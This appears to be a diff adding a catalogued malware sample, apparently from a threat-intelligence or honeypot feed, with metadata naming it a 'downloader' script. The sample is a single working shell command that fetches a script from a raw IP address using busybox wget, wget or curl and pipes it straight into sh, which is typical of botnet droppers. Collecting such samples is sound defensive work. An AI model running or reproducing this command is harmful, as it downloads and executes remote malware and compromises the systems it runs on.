@@ -1,0 +1,10 @@
+# sha256: 7aefcdef23405de0735c109a07c90e887ce851ef3e6c4921306f70d52ea2df57
+# family: downloader
+# kind: script
+# size_bytes: 147
+# first_seen: 2026-07-17 05:31:11.752040 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+(busybox wget -qO- http://45.153.34.153/rondo.\bmv.sh||wget -qO- http://45.153.34.153/rondo.\bmv.sh||curl -s http://45.153.34.153/rondo.\bmv.sh)|sh
